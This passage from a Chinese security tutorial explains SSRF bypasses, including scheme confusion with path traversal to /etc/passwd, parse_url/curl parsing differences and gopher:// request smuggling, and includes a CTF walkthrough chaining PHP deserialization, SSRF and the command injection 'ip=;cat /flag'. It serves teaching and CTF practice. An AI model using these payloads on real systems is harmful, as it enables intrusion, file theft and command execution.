class=\"line\">echo file\\_get\\_contents($\\_GET\\[&#x27;url&#x27;\\]);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p>\n<p>httpsssss:&#x2F;&#x2F;</p>\n<p>此时<code>file_get_contents()</code>函数遇到了不认识的伪协议头“httpsssss:&#x2F;&#x2F;”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p>\n<p>ssrf.php?url&#x3D;httpsssss:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small\"\n                        alt=\"image-20210113130534208\"\n                 ></p>\n<p>这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。</p>\n<h3 id=\"利用URL的解析问题\"><a href=\"#利用URL的解析问题\" class=\"headerlink\" title=\"利用URL的解析问题\"></a>利用URL的解析问题</h3><p>该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为<a class=\"link\"   href=\"https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf\" >《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》<i class=\"fas fa-external-link-alt\"></i></a>的分享。主要是利用readfile和parse_url函数的解析差异以及curl和parse_url解析差异来进行绕过。</p>\n<p><strong>（1）利用readfile和parse_url函数的解析差异绕过指定的端口</strong></p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = &#x27;http://&#x27;. $\\_GET\\[url\\];</span><br><span class=\"line\">$parsed = parse\\_url($url);</span><br><span class=\"line\">if( $parsed\\[port\\] == 80 )&#123;  // 这里限制了我们传过去的url只能是80端口的</span><br><span class=\"line\">\treadfile($url);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">\tdie(&#x27;Hacker!&#x27;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用python在当前目录下起一个端口为11211的WEB服务：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg\"\n                        alt=\"image-20210113133210683\"\n                 ></p>\n<p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：</p>\n<p>ssrf.php?url&#x3D;127.0.0.1:11211:80&#x2F;flag.txt</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg\"\n                        alt=\"image-20210113133242461\"\n                 ></p>\n<p>如上图所示成功读取了11211端口中的flag.txt文件，下面用BlackHat的图来说明原理：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                        alt=\"1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                 ></p>\n<p>从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。</p>\n<p>这两个函数在解析host的时候也有差异，如下图：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                        alt=\"1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                 ></p>\n<p>readfile()函数获取的是@号后面一部分（evil.com），而parse_url()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parse_url()函数对指定host的限制。</p>\n<p><strong>（2）利用curl和parse_url的解析差异绕指定的host</strong></p>\n<p>原理如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg\"\n                        alt=\"1610601386_5fffd3aa565a51587d90c.png!small?1610601386867\"\n                 ></p>\n<p>从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse_url()函数对指定host的限制。</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">function check\\_inner\\_ip($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $match\\_result=preg\\_match(&#x27;/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/&#x27;,$url);</span><br><span class=\"line\">    if (!$match\\_result)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    try</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $url\\_parse=parse\\_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    catch(Exception $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $hostname=$url\\_parse\\[&#x27;host&#x27;\\];</span><br><span class=\"line\">    $ip=gethostbyname($hostname);</span><br><span class=\"line\">    $int\\_ip=ip2long($ip);</span><br><span class=\"line\">    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int\\_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int\\_ip&gt;&gt;16;// 检查是否是内网ip</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function safe\\_request\\_url($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (check\\_inner\\_ip($url))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $url.&#x27; is inner ip&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch = curl\\_init();</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_URL, $url);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);</span><br><span class=\"line\">        $output = curl\\_exec($ch);</span><br><span class=\"line\">        $result\\_info = curl\\_getinfo($ch);</span><br><span class=\"line\">        if ($result\\_info\\[&#x27;redirect\\_url&#x27;\\])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            safe\\_request\\_url($result\\_info\\[&#x27;redirect\\_url&#x27;\\]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl\\_close($ch);</span><br><span class=\"line\">        var\\_dump($output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">if(!empty($url))&#123;</span><br><span class=\"line\">    safe\\_request\\_url($url);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上述代码中可以看到<code>check_inner_ip</code>函数通过<code>url_parse()</code>函数检测是否为内网IP，如果不是内网 IP ，则通过<code>curl()</code>请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让<code>parse_url()</code>处理外部网站网址，最后<code>curl()</code>请求内网网址。paylaod如下：</p>\n<p>ssrf.php?url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:<a class=\"link\"   href=\"mailto:&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;\" >&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;<i class=\"fas fa-external-link-alt\"></i></a>&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg\"\n                        alt=\"image-20210113134443846\"\n                 ></p>\n<p>的 <a class=\"link\"   href=\"https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5\" >[2020 首届“祥云杯”网络安全大赛]doyouknowssrf<i class=\"fas fa-external-link-alt\"></i></a>这道题利用的就是这个思路。</p>\n<h2 id=\"常见攻击方式（Gopher协议）\"><a href=\"#常见攻击方式（Gopher协议）\" class=\"headerlink\" title=\"常见攻击方式（Gopher协议）\"></a>常见攻击方式（Gopher协议）</h2><h3 id=\"Gopher协议在SSRF中的利用\"><a href=\"#Gopher协议在SSRF中的利用\" class=\"headerlink\" title=\"Gopher协议在SSRF中的利用\"></a>Gopher协议在SSRF中的利用</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。</p>\n<p>现在的Gopher协议已经很少有人再使用它了，但是该协议在SSRF中却可以发挥巨大的作用，可以说是SSRF中的万金油。由于Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。</p>\n<p><strong>（1）Gopher协议格式</strong></p>\n<p>URL: gopher:&#x2F;&#x2F;<host>:<port>&#x2F;<gopher-path>_后接TCP数据流  </p>\n<p># 注意不要忘记后面那个下划线”_“，下划线”_“后面才开始接TCP数据流，如果不加这个”_“，那么服务端收到的消息将不是完整的，该字符可随意写。</p>\n<ul>\n<li><p>gopher的默认端口是70</p>\n</li>\n<li><p>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>来代替<code>%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</p>\n</li>\n</ul>\n<blockquote>\n<p>那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：</p>\n<ol>\n<li><p>抓取或构造HTTP数据包</p>\n</li>\n<li><p>URL编码、将回车换行符<code>%0a</code>替换为<code>%0d%0a</code></p>\n</li>\n<li><p>发送符合gopher协议格式的请求</p>\n</li>\n</ol>\n</blockquote>\n<p><strong>（2）利用Gopher协议发送HTTP GET请求</strong></p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_GET\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br></pre></td></tr></table></figure>\n\n<p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse  </span><br><span class=\"line\">payload =\\\\  </span><br><span class=\"line\">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72  </span><br><span class=\"line\">&quot;&quot;&quot;    </span><br></pre></td></tr></table></figure>\n\n<p># 注意后面一定要有回车，回车结尾表示http请求结束  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)  </span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)  </span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new  </span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small\"\n                        alt=\"image-20210113170748727\"\n                 ></p>\n<blockquote>\n<p><strong>注意这几个问题：</strong></p>\n<ol>\n<li><p>问号（?）需要转码为URL编码，也就是%3f</p>\n</li>\n<li><p>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</p>\n</li>\n<li><p>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>\n</li>\n</ol>\n</blockquote>\n<p>然后执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg\"\n                        alt=\"image-20210113171043970\"\n                 ></p>\n<p>如上图，成功用GET方法传参并输出“Hello Bunny”。</p>\n<p><strong>（3）利用Gopher协议发送HTTP POST请求</strong></p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_POST\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br></pre></td></tr></table></figure>\n\n<p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami&#x3D;Bunny”的长度。</strong></p>\n<p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">payload =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"注意后面一定要有回车，回车结尾表示http请求结束\"><a href=\"#注意后面一定要有回车，回车结尾表示http请求结束\" class=\"headerlink\" title=\"注意后面一定要有回车，回车结尾表示http请求结束\"></a>注意后面一定要有回车，回车结尾表示http请求结束</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)</span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg\"\n                        alt=\"image-20210113171513366\"\n                 ></p>\n<p>然后执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small\"\n                        alt=\"image-20210113171641047\"\n                 ></p>\n<p>如上图，成功用POST方法传参并输出“Hello Bunny”。</p>\n<p><strong>[2020 科来杯初赛]Web1</strong>这道题就是典型的运用Gopher发送HTTP POST请求进行SSRF攻击的思路。</p>\n<h3 id=\"2020-科来杯初赛-Web1\"><a href=\"#2020-科来杯初赛-Web1\" class=\"headerlink\" title=\"[2020 科来杯初赛]Web1\"></a>[2020 科来杯初赛]Web1</h3><p>进入题目后即给处源码：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg\"\n                        alt=\"image-20200921134331679\"\n                 ></p>\n<p>这里很明显就是一个SSRF，url过滤了<code>file</code>、<code>ftp</code>，但是必须要包含<code>127.0.0.1</code>。并且，我们还发现一个tool.php页面，但是该页面进去之后仅显示一个“Not localhost”，我们可以用这个ssrf将tool.php的源码读住来，构造反序列化payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Welcome &#123;  </span><br><span class=\"line\">protected $url = &quot;http://127.0.0.1/tool.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$poc = new Welcome;  </span><br><span class=\"line\">//echo serialize($poc);  </span><br><span class=\"line\">echo urlencode(serialize($poc));  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>生成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">// O:7:&quot;Welcome&quot;:1:&#123;s:6:&quot;\\*url&quot;;s:25:&quot;http://127.0.0.1/tool.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将Welcome后面表示对象属性个数的“1”改为“2”即可绕过<code>__destruct()</code>的限制。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small\"\n                        alt=\"image-20200921134812338\"\n                 ></p>\n<p>读出来tool.php的源码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#tool.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error\\_reporting(0);</span><br><span class=\"line\">$respect\\_show\\_ping = function($params) &#123;</span><br><span class=\"line\">   extract($params);</span><br><span class=\"line\">   $ip = isset($ip) ? $ip :&#x27;127.0.0.1&#x27;;</span><br><span class=\"line\">   system(&#x27;ping -c 1 &#x27;.$ip);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">if ($\\_SERVER\\[&quot;REMOTE\\_ADDR&quot;\\] !== &quot;127.0.0.1&quot;)&#123;</span><br><span class=\"line\">   echo &#x27;&lt;h2&gt;Not localhost!&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">   highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">   $respect\\_show\\_ping($\\_POST);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可知tool.php页面存在命令执行漏洞。当REMOTE_ADDR为127.0.0.1时才可执行命令。REMOTE_ADDR头获取的是客户端的真实的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可以伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值。而X-Forwarded-For的值是可以篡改的。</p>\n<p>既然这里要求当REMOTE_ADDR为127.0.0.1时才可执行命令，且REMOTE_ADDR的值是不可以伪造的，我们要想让REMOTE_ADDR的值为127.0.0.1，不可能通过修改X-Forwarded-For的值来实现，我们要利用SSRF。</p>\n<p>我们可以利用index.php页面的SSRF利用gopher协议发POST包请求tool.php，进行命令执行。这样，整个攻击过程是在服务端进行的REMOTE_ADDR的值也就是127.0.0.1了。</p>\n<p>SSRF，利用gopher发POST包，进行命令执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">test =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /tool.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 13</span><br><span class=\"line\"></span><br><span class=\"line\">ip=;cat /flag</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n<p>#注意后面一定要有回车，回车结尾表示http请求结束</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(test)</span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p>这里因为我们是把payload发送到服务端让服务端执行，所以我们的Host和gopher里的Host为127.0.0.1。</p>\n<p>生成gopher协议格式的payload为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p>然后构造反序列化exp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Welcome &#123;</span><br><span class=\"line\">    protected $url = &quot;gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$poc = new Welcome;</span><br><span class=\"line\">//echo serialize($poc);</span><br><span class=\"line\">echo urlencode(serialize($poc));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>生成payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D</span><br><span class=\"line\"></span><br><span 